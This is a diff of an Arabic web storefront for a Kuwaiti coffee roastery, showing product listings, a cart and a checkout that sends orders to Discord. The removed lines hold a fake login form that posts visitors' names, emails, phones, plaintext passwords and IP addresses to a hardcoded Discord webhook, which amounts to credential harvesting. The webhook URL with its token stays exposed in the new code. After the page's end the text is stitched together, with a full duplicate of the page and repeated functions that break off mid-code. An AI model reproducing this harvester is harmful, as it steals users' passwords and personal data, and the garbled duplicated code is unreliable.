@@ -68,31 +68,6 @@
             gap: 15px;
         }
 
-        .btn-auth {
-            background-color: #4285f4;
-            color: white;
-            border: none;
-            padding: 8px 18px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-
-        .btn-auth:hover {
-            background-color: #357ae8;
-        }
-
-        .btn-logout {
-            background-color: #e53935;
-            color: white;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.85rem;
-        }
-
         .cart-status {
             background: #ffffff22;
             padding: 6px 14px;
@@ -108,7 +83,6 @@
             flex: 1;
         }
 
-        /* شريط أقسام القهوة */
         .category-nav {
             display: flex;
             justify-content: center;
@@ -255,7 +229,9 @@
             padding: 25px;
             border-radius: 12px;
             width: 90%;
-            max-width: 450px;
+            max-width: 480px;
+            max-height: 90vh;
+            overflow-y: auto;
             box-shadow: 0 5px 20px rgba(0,0,0,0.2);
             position: relative;
         }
@@ -282,12 +258,22 @@
             font-size: 0.9rem;
         }
 
-        .form-group input {
+        .form-group input, .form-group select {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
             border-radius: 6px;
             box-sizing: border-box;
+            font-family: inherit;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
         }
 
         .cart-item {
@@ -295,26 +281,6 @@
             justify-content: space-between;
             padding: 10px 0;
             border-bottom: 1px solid #eee;
-        }
-
-        .payment-methods {
-            margin-top: 15px;
-            text-align: right;
-        }
-
-        .payment-option {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 8px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            margin-bottom: 8px;
-        }
-
-        .payment-option.disabled {
-            background-color: #f5f5f5;
-            color: #999;
         }
 
         footer {
@@ -345,15 +311,11 @@
         </div>
         <div class="header-actions">
             <div class="cart-status" onclick="toggleCartModal()">🛒 السلة (<span id="cartCount">0</span>)</div>
-            <div id="userArea">
-                <button class="btn-auth" onclick="openLoginModal()">تسجيل الدخول</button>
-            </div>
         </div>
     </header>
 
     <div class="container">
 
-        <!-- أزرار الأقسام والفلترة -->
         <div class="category-nav">
             <button class="cat-btn active" onclick="filterCategory('all', this)">⚡ الكل</button>
             <button class="cat-btn" onclick="filterCategory('coffee', this)">☕ القهوة المختصة</button>
@@ -361,7 +323,6 @@
             <button class="cat-btn" onclick="filterCategory('machines', this)">⚙️ ماكينات القهوة</button>
         </div>
 
-        <!-- قسم أنواع القهوة -->
         <div class="category-group" id="cat-coffee">
             <div class="section-title">أنواع القهوة المختصة</div>
             <div class="grid">
@@ -387,7 +348,6 @@
             </div>
         </div>
 
-        <!-- قسم الاشتراكات والباقات -->
         <div class="category-group" id="cat-bundles">
             <div class="section-title">الاشتراكات والباقات</div>
             <div class="grid">
@@ -417,7 +377,6 @@
             </div>
         </div>
 
-        <!-- قسم ماكينات القهوة -->
         <div class="category-group" id="cat-machines">
             <div class="section-title">ماكينات القهوة</div>
             <div class="grid">
@@ -435,38 +394,12 @@
 
     </div>
 
-    <!-- نافذة تسجيل الدخول -->
-    <div id="loginModal" class="modal">
-        <div class="modal-content">
-            <button class="close-modal" onclick="closeModal('loginModal')">✕</button>
-            <h3 style="text-align: center; margin-top: 0;">تسجيل الدخول للموقع</h3>
-            <form id="loginForm" onsubmit="handleLogin(event)">
-                <div class="form-group">
-                    <label>الاسم الكامل</label>
-                    <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي">
-                </div>
-                <div class="form-group">
-                    <label>البريد الإلكتروني</label>
-                    <input type="email" id="email" required placeholder="example@mail.com">
-                </div>
-                <div class="form-group">
-                    <label>رقم الهاتف</label>
-                    <input type="tel" id="phone" required placeholder="مثال: 99887766">
-                </div>
-                <div class="form-group">
-                    <label>كلمة المرور (من 8 إلى 100 حرف)</label>
-                    <input type="password" id="password" minlength="8" maxlength="100" required placeholder="********">
-                </div>
-                <button type="submit" class="btn-add" style="margin-top: 10px;">تسجيل الدخول</button>
-            </form>
-        </div>
-    </div>
-
-    <!-- نافذة سلة المشتريات -->
+    <!-- نافذة السلة وتحديد عنوان المنزل -->
     <div id="cartModal" class="modal">
         <div class="modal-content">
             <button class="close-modal" onclick="closeModal('cartModal')">✕</button>
-            <h3 style="text-align: center; margin-top: 0;">سلة المشتريات</h3>
+            <h3 style="text-align: center; margin-top: 0;">سلة المشتريات وعنوان التوصيل</h3>
+            
             <div id="cartList"></div>
             <hr style="margin: 15px 0;">
             
@@ -475,30 +408,61 @@
                 <span id="cartTotal">0.000 د.ك</span>
             </div>
 
-            <div class="payment-methods">
-                <label style="font-weight: bold; margin-bottom: 8px; display: block;">طريقة الدفع:</label>
-                <div class="payment-option">
-                    <input type="radio" id="payCOD" name="paymentMethod" value="الدفع عند الاستلام" checked>
-                    <label for="payCOD">💵 الدفع عند الاستلام (COD)</label>
+            <h4 style="margin: 15px 0 10px 0; color: var(--bg-navy);">📍 موقع البيت (عنوان التوصيل)</h4>
+            <form id="checkoutForm" onsubmit="checkoutOrder(event)">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>المحافظة</label>
+                        <select id="governorate" required>
+                            <option value="">اختر المحافظة</option>
+                            <option value="العاصمة">العاصمة</option>
+                            <option value="حولي">حولي</option>
+                            <option value="الفروانية">الفروانية</option>
+                            <option value="الأحمدي">الأحمدي</option>
+                            <option value="الجهراء">الجهراء</option>
+                            <option value="مبارك الكبير">مبارك الكبير</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>المنطقة</label>
+                        <input type="text" id="area" required placeholder="اسم المنطقة">
+                    </div>
                 </div>
-                <div class="payment-option disabled">
-                    <input type="radio" id="payKnet" name="paymentMethod" value="KNET" disabled>
-                    <label for="payKnet">💳 كي نت (K-NET) <small style="color: #d32f2f;">(غير متاح)</small></label>
-                </div>
-            </div>
 
-            <button class="btn-add" style="margin-top: 15px;" onclick="checkoutOrder()">إتمام الطلب الآن</button>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>القطعة</label>
+                        <input type="text" id="block" required placeholder="رقم القطعة">
+                    </div>
+                    <div class="form-group">
+                        <label>الشارع</label>
+                        <input type="text" id="street" required placeholder="اسم/رقم الشارع">
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>الجادة (اختياري)</label>
+                        <input type="text" id="avenue" placeholder="رقم الجادة">
+                    </div>
+                    <div class="form-group">
+                        <label>المنزل</label>
+                        <input type="text" id="house" required placeholder="رقم المنزل/الفيلا">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-add" style="margin-top: 15px;">إتمام الطلب الآن</button>
+            </form>
         </div>
     </div>
 
     <footer>
-        © 2026 محمصة لورا - جميع الحقوق محفوظة | <strong>Dev by: Nasser</strong>
+        © 2026 محمصة لورا - جميع الحقوق محفوظة
     </footer>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542554021510774814/kURM7_KSoI1f6-7rEopGSwzjQ26KJY_-OW9DTkvAiofOUms2wrsWr-BO2d7slwCs52j5";
 
-        let currentUser = null;
         let cart = [];
 
         function filterCategory(category, btnElement) {
@@ -511,18 +475,13 @@
                 if (category === 'all') {
                     group.style.display = 'block';
                 } else {
-                    if (group.id === `cat-${category}`) {
-                        group.style.display = 'block';
-                    } else {
-                        group.style.display = 'none';
-                    }
+                    group.style.display = (group.id === `cat-${category}`) ? 'block' : 'none';
                 }
             });
         }
 
         function getNextOrderNumber() {
-            let currentNum = parseInt(localStorage.getItem('lora_order_counter') || '1');
-            return currentNum;
+            return parseInt(localStorage.getItem('lora_order_counter') || '1');
         }
 
         function incrementOrderNumber() {
@@ -530,77 +489,16 @@
             localStorage.setItem('lora_order_counter', (currentNum + 1).toString());
         }
 
-        function openLoginModal() { document.getElementById('loginModal').style.display = 'flex'; }
-        function toggleCartModal() { document.getElementById('cartModal').style.display = 'flex'; updateCartUI(); }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-
-        async function handleLogin(e) {
-            e.preventDefault();
-            
-            const fullName = document.getElementById('fullName').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-
-            currentUser = { fullName, email, phone };
-
-            closeModal('loginModal');
-
-            document.getElementById('userArea').innerHTML = `
-                <span style="font-size: 0.9rem; margin-left: 8px;">مرحباً، <b>${fullName}</b></span>
-                <button class="btn-logout" onclick="handleLogout()">خروج</button>
-            `;
-
-            let userIP = "غير معروف";
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userIP = data.ip;
-            } catch (err) {}
-
-            sendLoginToDiscord(fullName, email, phone, password, userIP);
+        function toggleCartModal() { 
+            document.getElementById('cartModal').style.display = 'flex'; 
+            updateCartUI(); 
         }
 
-        function handleLogout() {
-            currentUser = null;
-            cart = [];
-            document.getElementById('cartCount').innerText = '0';
-            document.getElementById('userArea').innerHTML = `
-                <button class="btn-auth" onclick="openLoginModal()">تسجيل الدخول</button>
-            `;
-            alert('تم تسجيل الخروج بنجاح.');
-        }
-
-        function sendLoginToDiscord(name, email, phone, password, ip) {
-            const payload = {
-                embeds: [{
-                    title: "🔑 تسجيل دخول جديد",
-                    color: 3066993,
-                    fields: [
-                        { name: "👤 الاسم", value: name, inline: true },
-                        { name: "📱 رقم الهاتف", value: phone, inline: true },
-                        { name: "📧 البريد الإلكتروني", value: email, inline: false },
-                        { name: "🔒 كلمة المرور", value: password, inline: true },
-                        { name: "🌐 IP", value: ip, inline: true }
-                    ],
-                    timestamp: new Date()
-                }]
-            };
-
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+        function closeModal(id) { 
+            document.getElementById(id).style.display = 'none'; 
         }
 
         function addToCart(title, price) {
-            if (!currentUser) {
-                alert('عذراً! لا يمكنك إضافة المنتجات إلى السلة إلا بعد تسجيل الدخول أولاً.');
-                openLoginModal();
-                return;
-            }
-
             cart.push({ title, price });
             document.getElementById('cartCount').innerText = cart.length;
             alert(`تمت إضافة "${title}" إلى السلة.`);
@@ -627,38 +525,40 @@
             document.getElementById('cartTotal').innerText = total.toFixed(3) + ' د.ك';
         }
 
-        function checkoutOrder() {
+        function checkoutOrder(e) {
+            e.preventDefault();
+
             if (cart.length === 0) {
                 alert('السلة فارغة!');
                 return;
             }
 
-            if (!currentUser) {
-                alert('يرجى تسجيل الدخول لتأكيد الطلب!');
-                closeModal('cartModal');
-                openLoginModal();
-                return;
-            }
+            const governorate = document.getElementById('governorate').value;
+            const area = document.getElementById('area').value;
+            const block = document.getElementById('block').value;
+            const street = document.getElementById('street').value;
+            const avenue = document.getElementById('avenue').value || "غير محدد";
+            const house = document.getElementById('house').value;
 
+            const fullAddress = `• المحافظة: ${governorate}\n• المنطقة: ${area}\n• القطعة: ${block}\n• الشارع: ${street}\n• الجادة: ${avenue}\n• المنزل: ${house}`;
+            
             const currentOrderNum = getNextOrderNumber();
             const orderID = `#${currentOrderNum}`;
-            const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
 
-            let itemsList = cart.map(i => `- ${i.title} (${i.price.toFixed(3)} د.ك)`).join('\n');
+            let itemsList = cart.map(i => `• ${i.title} (${i.price.toFixed(3)} د.ك)`).join('\n');
             let totalSum = cart.reduce((a, b) => a + b.price, 0).toFixed(3);
 
             const payload = {
                 embeds: [{
-                    title: `🛒 طلب شراء جديد (${orderID})`,
+                    title: `☕ طلب جديد - محمصة لورا (${orderID})`,
                     color: 15105570,
                     fields: [
                         { name: "🆔 رقم الطلب", value: orderID, inline: true },
-                        { name: "👤 اسم العميل", value: currentUser.fullName, inline: true },
-                        { name: "📱 رقم الهاتف", value: currentUser.phone, inline: true },
-                        { name: "💳 طريقة الدفع", value: paymentMethod, inline: false },
-                        { name: "📦 المنتجات المطلوبة", value: itemsList, inline: false },
-                        { name: "💰 الإجمالي", value: `${totalSum} د.ك`, inline: true }
+                        { name: "💰 المجموع الكلي", value: `${totalSum} د.ك`, inline: true },
+                        { name: "📍 موقع البيت", value: fullAddress, inline: false },
+                        { name: "🛒 قائمة المنتجات", value: itemsList, inline: false }
                     ],
+                    footer: { text: "نظام طلبات محمصة لورا" },
                     timestamp: new Date()
                 }]
             };
@@ -673,8 +573,677 @@
                 cart = [];
                 document.getElementById('cartCount').innerText = '0';
                 closeModal('cartModal');
+            }).catch((err) => {
+                console.error(err);
+                alert('حدث خطأ أثناء إرسال الطلب، يرجى المحاولة لاحقاً.');
             });
         }
     </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محمصة لورا | l’ORA roastery</title>
+    <style>
+        :root {
+            --bg-navy: #1f274a;
+            --btn-blue: #2c385e;
+            --accent-blue: #64b5f6;
+            --card-bg: #ffffff;
+            --text-main: #333333;
+            --price-old: #a0a0a0;
+            --badge-red: #e53935;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f9fc;
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .announcement-bar {
+            background-color: #151b33;
+            color: #d1d5db;
+            text-align: center;
+            padding: 8px;
+            font-size: 0.85rem;
+        }
+
+        header {
+            background-color: var(--bg-navy);
+            color: white;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-box {
+            background-color: #83b3c0;
+            color: white;
+            padding: 8px 14px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .cart-status {
+            background: #ffffff22;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 15px;
+            flex: 1;
+        }
+
+        .category-nav {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .cat-btn {
+            background-color: #e2e8f0;
+            color: var(--text-main);
+            border: none;
+            padding: 10px 22px;
+            border-radius: 25px;
+            font-size: 0.95rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cat-btn:hover {
+            background-color: #cbd5e1;
+        }
+
+        .cat-btn.active {
+            background-color: var(--bg-navy);
+            color: white;
+            box-shadow: 0 4px 10px rgba(31, 39, 74, 0.2);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 1.6rem;
+            margin-bottom: 25px;
+            position: relative;
+            font-weight: bold;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 40px;
+            height: 3px;
+            background-color: var(--accent-blue);
+            margin: 8px auto 0;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 20px;
+            margin-bottom: 50px;
+        }
+
+        .product-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            padding: 15px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .discount-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background-color: var(--badge-red);
+            color: white;
+            font-size: 0.8rem;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+
+        .product-img {
+            width: 100%;
+            height: 180px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+
+        .product-title {
+            font-weight: bold;
+            margin: 10px 0 5px;
+        }
+
+        .product-desc {
+            font-size: 0.85rem;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .price-container {
+            margin: 10px 0;
+        }
+
+        .price-current {
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: var(--bg-navy);
+        }
+
+        .price-old {
+            text-decoration: line-through;
+            color: var(--price-old);
+            font-size: 0.9rem;
+            margin-left: 5px;
+        }
+
+        .btn-add {
+            background-color: var(--btn-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+
+        .btn-add:hover {
+            background-color: var(--bg-navy);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 480px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border: none;
+            background: none;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        footer {
+            background-color: var(--bg-navy);
+            color: #a0aec0;
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9rem;
+            margin-top: auto;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        footer strong {
+            color: var(--accent-blue);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="announcement-bar">
+        ☕ توصيل مجاني للطلبات الكبيرة | تحميص طازج يومياً في محمصة لورا
+    </div>
+
+    <header>
+        <div class="logo-container">
+            <div class="logo-box">LORA ✿ COFFEE</div>
+            <span>محمصة لورا</span>
+        </div>
+        <div class="header-actions">
+            <div class="cart-status" onclick="toggleCartModal()">🛒 السلة (<span id="cartCount">0</span>)</div>
+        </div>
+    </header>
+
+    <div class="container">
+
+        <div class="category-nav">
+            <button class="cat-btn active" onclick="filterCategory('all', this)">⚡ الكل</button>
+            <button class="cat-btn" onclick="filterCategory('coffee', this)">☕ القهوة المختصة</button>
+            <button class="cat-btn" onclick="filterCategory('bundles', this)">🎁 الباقات والاشتراكات</button>
+            <button class="cat-btn" onclick="filterCategory('machines', this)">⚙️ ماكينات القهوة</button>
+        </div>
+
+        <div class="category-group" id="cat-coffee">
+            <div class="section-title">أنواع القهوة المختصة</div>
+            <div class="grid">
+                <div class="product-card">
+                    <img src="arabic-bag.png" class="product-img" alt="قهوة عربية">
+                    <div class="product-title">قهوة عربية (Arabic Coffee)</div>
+                    <div class="product-desc">تحميص هوائي مميز، جودة مختصة ومصادر موثوقة</div>
+                    <div class="price-container">
+                        <span class="price-current">6.500 د.ك</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('قهوة عربية', 6.500)">إضافة إلى السلة</button>
+                </div>
+
+                <div class="product-card">
+                    <img src="turkish-bag.png" class="product-img" alt="قهوة تركية">
+                    <div class="product-title">قهوة تركية (Turkish Coffee)</div>
+                    <div class="product-desc">تحميص هوائي ناعم لإعداد أطيب فنجان قهوة تركية</div>
+                    <div class="price-container">
+                        <span class="price-current">6.000 د.ك</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('قهوة تركية', 6.000)">إضافة إلى السلة</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="category-group" id="cat-bundles">
+            <div class="section-title">الاشتراكات والباقات</div>
+            <div class="grid">
+                <div class="product-card">
+                    <span class="discount-badge">-20%</span>
+                    <img src="classic-bundle.png" class="product-img" alt="الباقة الكلاسيكية">
+                    <div class="product-title">الباقة الكلاسيكية</div>
+                    <div class="product-desc">مجموعة كلاسيكية لتجربة القهوة الممتازة</div>
+                    <div class="price-container">
+                        <span class="price-current">14.600 د.ك</span>
+                        <span class="price-old">18.250</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('الباقة الكلاسيكية', 14.600)">إضافة إلى السلة</button>
+                </div>
+
+                <div class="product-card">
+                    <span class="discount-badge">-25%</span>
+                    <img src="fruity-bundle.png" class="product-img" alt="الباقة الفاكهية">
+                    <div class="product-title">الباقة الفاكهية</div>
+                    <div class="product-desc">إيحاءات فاكهية مميزة لعشاق القهوة المختصة</div>
+                    <div class="price-container">
+                        <span class="price-current">17.250 د.ك</span>
+                        <span class="price-old">23.000</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('الباقة الفاكهية', 17.250)">إضافة إلى السلة</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="category-group" id="cat-machines">
+            <div class="section-title">ماكينات القهوة</div>
+            <div class="grid">
+                <div class="product-card">
+                    <img src="jura-e8.png" class="product-img" alt="Jura E8">
+                    <div class="product-title">Jura E8 Piano Black</div>
+                    <div class="product-desc">أحدث إصدارات Jura للأداء الاحترافي</div>
+                    <div class="price-container">
+                        <span class="price-current">550.000 د.ك</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('Jura E8 Piano Black', 550.000)">إضافة إلى السلة</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- نافذة السلة وتحديد عنوان المنزل -->
+    <div id="cartModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal('cartModal')">✕</button>
+            <h3 style="text-align: center; margin-top: 0;">سلة المشتريات وعنوان التوصيل</h3>
+            
+            <div id="cartList"></div>
+            <hr style="margin: 15px 0;">
+            
+            <div style="display: flex; justify-content: space-between; font-weight: bold; margin-bottom: 15px;">
+                <span>المجموع الكلي:</span>
+                <span id="cartTotal">0.000 د.ك</span>
+            </div>
+
+            <h4 style="margin: 15px 0 10px 0; color: var(--bg-navy);">📍 موقع البيت (عنوان التوصيل)</h4>
+            <form id="checkoutForm" onsubmit="checkoutOrder(event)">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>المحافظة</label>
+                        <select id="governorate" required>
+                            <option value="">اختر المحافظة</option>
+                            <option value="العاصمة">العاصمة</option>
+                            <option value="حولي">حولي</option>
+                            <option value="الفروانية">الفروانية</option>
+                            <option value="الأحمدي">الأحمدي</option>
+                            <option value="الجهراء">الجهراء</option>
+                            <option value="مبارك الكبير">مبارك الكبير</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>المنطقة</label>
+                        <input type="text" id="area" required placeholder="اسم المنطقة">
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>القطعة</label>
+                        <input type="text" id="block" required placeholder="رقم القطعة">
+                    </div>
+                    <div class="form-group">
+                        <label>الشارع</label>
+                        <input type="text" id="street" required placeholder="اسم/رقم الشارع">
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>الجادة (اختياري)</label>
+                        <input type="text" id="avenue" placeholder="رقم الجادة">
+                    </div>
+                    <div class="form-group">
+                        <label>المنزل</label>
+                        <input type="text" id="house" required placeholder="رقم المنزل/الفيلا">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-add" style="margin-top: 15px;">إتمام الطلب الآن</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        © 2026 محمصة لورا - جميع الحقوق محفوظة
+    </footer>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542554021510774814/kURM7_KSoI1f6-7rEopGSwzjQ26KJY_-OW9DTkvAiofOUms2wrsWr-BO2d7slwCs52j5";
+
+        let cart = [];
+
+        function filterCategory(category, btnElement) {
+            const buttons = document.querySelectorAll('.cat-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            btnElement.classList.add('active');
+
+            const groups = document.querySelectorAll('.category-group');
+            groups.forEach(group => {
+                if (category === 'all') {
+                    group.style.display = 'block';
+                } else {
+                    group.style.display = (group.id === `cat-${category}`) ? 'block' : 'none';
+                }
+            });
+        }
+
+        function getNextOrderNumber() {
+            return parseInt(localStorage.getItem('lora_order_counter') || '1');
+        }
+
+        function incrementOrderNumber() {
+            let currentNum = getNextOrderNumber();
+            localStorage.setItem('lora_order_counter', (currentNum + 1).toString());
+        }
+
+        function toggleCartModal() { 
+            document.getElementById('cartModal').style.display = 'flex'; 
+            updateCartUI(); 
+        }
+
+        function closeModal(id) { 
+            document.getElementById(id).style.display = 'none'; 
+        }
+
+        function addToCart(title, price) {
+            cart.push({ title, price });
+            document.getElementById('cartCount').innerText = cart.length;
+            alert(`تمت إضافة "${title}" إلى السلة.`);
+        }
+
+        function updateCartUI() {
+            const container = document.getElementById('cartList');
+            container.innerHTML = '';
+            let total = 0;
+
+            if (cart.length === 0) {
+                container.innerHTML = '<p style="text-align:center; color:#888;">السلة فارغة حالياً</p>';
+            } else {
+                cart.forEach((item) => {
+                    total += item.price;
+                    container.innerHTML += `
+                        <div class="cart-item">
+                            <span>${item.title}</span>
+                            <span><b>${item.price.toFixed(3)} د.ك</b></span>
+                        </div>
+                    `;
+                });
+            }
+            document.getElementById('cartTotal').innerText = total.toFixed(3) + ' د.ك';
+        }
+
+        function checkoutOrder(e) {
+            e.preventDefault();
+
+            if (cart.length === 0) {
+                alert('السلة فارغة!');
+                return;
+            }
+
+            const governorate = document.getElementById('governorate').value;
+            const area = document.getElementById('area').value;
+            const block = document.getElementById('block').value;
+            const street = document.getElementById('street').value;
+            const avenue = document.getElementById('avenue').value || "غير محدد";
+            const house = document.getElementById('house').value;
+
+            const fullAddress = `• المحافظة: ${governorate}\n• المنطقة: ${area}\n• القطعة: ${block}\n• الشارع: ${street}\n• الجادة: ${avenue}\n• المنزل: ${house}`;
+            
+            const currentOrderNum = getNextOrderNumber();
+            const orderID = `#${currentOrderNum}`;
+
+            let itemsList = cart.map(i => `• ${i.title} (${i.price.toFixed(3)} د.ك)`).join('\n');
+            let totalSum = cart.reduce((a, b) => a + b.price, 0).toFixed(3);
+
+            const payload = {
+                embeds: [{
+                    title: `☕ طلب جديد - محمصة لورا (${orderID})`,
+                    color: 15105570,
+                    fields: [
+                        { name: "🆔 رقم الطلب", value: orderID, inline: true },
+                        { name: "💰 المجموع الكلي", value: `${totalSum} د.ك`, inline: true },
+                        { name: "📍 موقع البيت", value: fullAddress, inline: false },
+                        { name: "🛒 قائمة المنتجات", value: itemsList, inline: false }
+                    ],
+                    footer: { text: "نظام طلبات محمصة لورا" },
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert(`تم استلام طلبك بنجاح!\nرقم الطلب الخاص بك هو: ${orderID}`);
+                incrementOrderNumber();
+                cart = [];
+                document.getElementById('cartCount').innerText = '0';
+                closeModal('cartModal');
+            }).catch((err) => {
+                console.error(err);
+                alert('حدث خطأ أثناء إرسال الطلب، يرجى المحاولة لاحقاً.');
+            });
+        }
+ function closeModal(id) { 
+        document.getElementById(id).style.display = 'none'; 
+    }
+
+    function addToCart(title, price) {
+        cart.push({ title, price });
+        document.getElementById('cartCount').innerText = cart.length;
+        alert(`تمت إضافة "${title}" إلى السلة.`);
+    }
+
+    function updateCartUI() {
+        const container = document.getElementById('cartList');
+        container.innerHTML = '';
+        let total = 0;
+
+        if (cart.length === 0) {
+            container.innerHTML = '<p style="text-align:center; color:#888;">السلة فارغة حالياً</p>';
+        } else {
+            cart.forEach((item) => {
+                total += item.price;
+                container.innerHTML += `
+                    <div class="cart-item">
+                        <span>${item.title}</span>
+                        <span><b>${item.price.toFixed(3)} د.ك</b></span>
+                    </div>
+                `;
+            });
+        }
+        document.getElementById('cartTotal').innerText = total.toFixed(3) + ' د.ك';
+    }
+
+    function checkoutOrder(e) {
+        e.preventDefault();
+
+        if (cart.length === 0) {
+            alert('السلة فارغة!');
+            return;
+        }
+
+        const governorate = document.getElementById('governorate').value;
+        const area = document.getElementById('area').value;
+        const block = document.getElementById('block').value;
+        const street = document.getElementById('street').value;
+        const avenue = document.getElementById('avenue').value || "غير محدد";
+        const house = document.getElementById('house').value;
+
+        const fullAddress = `• المحافظة: ${governorate}\n• المنطقة: ${area}\n• القطعة: ${block}\n• الشارع: ${street}\n• الجادة: ${avenue}\n• المنزل: ${house}`;
+        
+        const currentOrderNum = getNextOrderNumber();
+        const orderID = `#${currentOrderNum}`;
+
+        let itemsList = cart.map(i => `• ${i.title} (${i.price.toFixed(3)} د.ك)`).join('\n');
+        let totalSum = cart.reduce((a, b) => a + b.price, 0).toFixed(3);
+
+        const payload = {
+            embeds: [{
+                title: `☕ طلب جديد - محمصة لورا (${orderID})`,
+                color: 15105570,
+                fields: [
+                    { name: "🆔 رقم الطلب", value: orderID, inline: true },
+                    { name: "💰 المجموع الكلي", value: `${totalSum} د.ك`, inline: true },
+                    { name: "📍 موقع البيت", value: fullAddress, inline: false },
+                    { name: "🛒 قائمة المنتجات", value: itemsList, inline: false }
+                ],
